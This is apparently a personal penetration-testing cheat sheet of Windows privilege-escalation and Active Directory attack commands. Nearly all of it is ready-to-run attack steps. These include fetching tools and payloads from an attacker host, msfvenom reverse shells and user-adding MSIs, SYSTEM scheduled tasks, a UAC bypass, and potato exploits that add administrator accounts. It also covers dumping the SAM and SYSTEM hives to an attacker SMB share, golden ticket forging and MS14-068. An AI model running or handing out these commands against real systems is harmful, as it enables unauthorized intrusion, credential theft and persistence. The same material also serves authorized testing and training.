`LOLBAS / WINDOWS`
[https://lolbas-project.github.io/](https://lolbas-project.github.io/)
System browsing:
---
```cmd
net user
```

```powershell
Get-LocalUser
```

```powershell
GCI -hidden -recurse
ls -force
```

```cmd
net user $USER
```

```cmd
netstat -an
netstat -an | findstr $PORT
```

```powershell
net accounts
```
Replace service
---
Get list of running services
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Check file permissions:

```powershell
icacls 'c:\...'
```
(F) - full permissions, read, write, execute

Check env vars:
```powershell
ls env:
```

or automate the process with PowerUp.ps1
#powerup #replace-service #privesc 
```powershell
iwr -uri http://$LOCAL_IP/PowerUp.ps1 -Outfile PowerUp.ps1
. .\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name '$SERVICE'
Restart-Service $SERVICE
Start-Service $SERVICE
```

Evil-WinRM:
#built-in #winrm #evilwinrm 

```powershell
services
download
upload
```
Scheduled Tasks:
---

#scheduled-tasks

```powershell
schtasks /query /fo LIST /v | findstr /i "c:\users"
schtasks /query /fo LIST /v | Select-String -Pattern "c:\\user" -Context 5,5
```

```powershell
schtasks /create /tn "shell" /tr "task.exe" /sc MINUTE /mo 1 /ru "SYSTEM"
```

```bash
msfvenom -p windows/adduser USER=admin2 PASS=P@ssword123! -f msi-nouac -o alwe.msi
```

Using RunasCs.exe to bypass UAC:
#uac #bypass-uac

```powershell
.\RunasCs.exe $USER $PASS $CMD --bypass-uac -l 5
```
Search for passwords inside the registry
---
#search #registry
```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Find misconfigured services (default settings)
---
```powershell
cmd /c wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" |findstr /i /v "\`""
```

#unquoted #service-privesc

```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v "\`"" | findstr ":"
```

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Stop-Service $SERVICE
Write-ServiceBinary -Name '$SERVICE' -Path "C:\$UNQUOTED_PATH"
Restart-Service $SERVICE
```

Abusing enabled `SeImpersonatePrivilege` with PrinterSpoofer64:

```powershell
whoami /priv | select-string "SeImpersonatePrivilege(.*)Enabled"
iwr -uri http://$LOCAL_IP/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```

adding user with godpotato.exe
```powershell
.\GodPotato.exe -cmd "net user test Password123! /add"
.\GodPotato.exe -cmd "net localgroup administrators test /add"
.\GodPotato.exe -cmd 'net localgroup \"Remote Desktop Users\" test /add'
.\GodPotato.exe -cmd 'net localgroup \"Remote Management Users\" test /add'
```
or add to scheduled tasks, generate shell.exe using msfvenom:
```powershell
iwr $KALI_IP/shell.exe -outfile c:\windows\tasks\shell.exe
./godpotato -cmd 'cmd /c SCHTASKS /CREATE /SC MINUTE /TN "shell" /TR "c:\windows\tasks\shell.exe" /RU "SYSTEM" /MO 1'
./godpotato -cmd 'cmd /c SCHTASKS /RUN /TN "shell"'
```

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80
```

Other privileges that can be exploited if enabled: 
`SeBackupPrivilege` `SeAssignPrimaryToken` `SeLoadDriver` `SeDebugPrivilege` `SeRestorePrivilege`

 Abuse:
#SeDebugPrivilege 

```bash
impacket-smbserver -smb2support s .
```

```powershell
cd c:\
reg save hklm\sam c:\temp\sam
reg save hklm\system c:\temp\system
cp system //$LOCAL_IP/s/system
cp sam //$LOCAL_IP/s/sam
```

```bash
pypykatz registry --sam sam system
```

#SeRestorePrivilege

```bash
wget https://github.com/dxnboy/redteam/raw/master/SeRestoreAbuse.exe
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe > shell.exe
```

```powershell
./SeRestoreAbuse.exe 'cmd /c C:\tools\shell.exe'
```
Generate Payload for DLL hijacking
---
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f dll -o revshell.dll
```
Golden ticket
---
generate user password hash:

```python
import hashlib
hashlib.new('md4', '$PASSWORD'.encode('utf-16le')).digest().hex()
# save hash for later
```

or use

```url
https://gchq.github.io/CyberChef/#recipe=NT_Hash()
```

```powershell
get-addomain
#extract DomainSID
```

```shell
ticketer.py -nthash $HASH -domainsid $DOMAINSID -domain $TARGET_AD -spn AnyName/dc.$TARGET_AD administrator
```

```shell
KRB5CCNAME=administrator.ccache mssqlclient.py -k administrator@$DCDOMAIN
```

GoldenPAC ms14-068

```bash
impacket-goldenPac -dc-ip $TARGET_IP -target-ip $TARGET_IP '$TARGET_AD/$USER:$PASSWORD@$MACHINE.$TARGET_AD'
```

Port scanning using PowerShell
---

Scan if single port is open:
```powershell
Test-NetConnection 127.0.0.1 -Port $port
```

scan ports from 1 to 1024(slow):
```powershell
foreach ($port in 1..1024){If(($a=Test-NetConnection 127.0.0.1 -Port $port -WarningAction SilentlyContinue).TcpTestSucceeded -eq $true){"TCP port $port is open"}}
```